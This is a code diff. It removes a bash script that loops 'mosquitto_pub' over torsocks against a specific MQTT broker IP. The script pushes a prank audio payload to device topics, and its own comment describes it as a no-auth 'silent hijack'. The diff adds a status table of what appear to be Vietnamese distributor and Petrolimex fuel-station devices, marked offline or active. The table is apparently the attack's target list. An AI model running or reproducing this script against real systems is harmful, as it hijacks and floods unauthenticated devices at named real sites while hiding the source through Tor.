@@ -1,11 +1,13 @@
-#!/bin/bash
-# PEPPE_VOV_NUKE.sh - No auth, silent hijack (Authorized pentest)
-
-PEPPE='{"n":"88171961789418494:s:16","m":"audio/mpeg","u":"https://www.myinstants.com/media/sounds/peppe-brescia-poeta.mp3"}'
-
-while true; do
-  torsocks mosquitto_pub -h 42.1.64.56 -p 1883 -t "88171961789418494:s:16" -m "$PEPPE" -q
-  torsocks mosquitto_pub -h 42.1.64.56 -p 1883 -t "88171961789418495:s:16" -m "$PEPPE" -q
-  torsocks mosquitto_pub -h 42.1.64.56 -p 1883 -t "17541961789418494:s:16" -m "$PEPPE" -q
-  sleep 1
-done
+NDVANPHONG	Nhà phân phối	Hanoi centrale?	OFFLINE
+CLDAMHA	Cửa Lò	Hải Phòng/Nord	TREO CÒ (attiva)
+NDHONGSON	Nhà phân phối	Hanoi/Nord	OFFLINE
+T608LONGBIEN	Petrolimex T608	Long Biên, Hanoi ✅	TREO CÒ (attiva)
+NDNINHPHUC	Nhà phân phối	Ninh Phú (Ninh Bình?)	TREO CÒ (attiva)
+PTMANPHONG	Petrolimex	Mẫn Phong	OFFLINE
+NDDAIAN	Nhà phân phối	Đại An	OFFLINE
+CLHATU	Cửa Lò	Hà Tú	TREO CÒ (attiva)
+NDLIENMINH	Nhà phân phối	Liên Minh	TREO CÒ (attiva)
+NDLIEMPHONG	Nhà phân phối	Diễm Phong	TREO CÒ (attiva)
+NDMYLOC	Nhà phân phối	Mỹ Lộc	OFFLINE
+CLCAMSON	Cửa Lò	Cầm Sơn	OFFLINE
+CLVANLANG	Cửa Lò	Văn Lang	TREO CÒ (attiva)
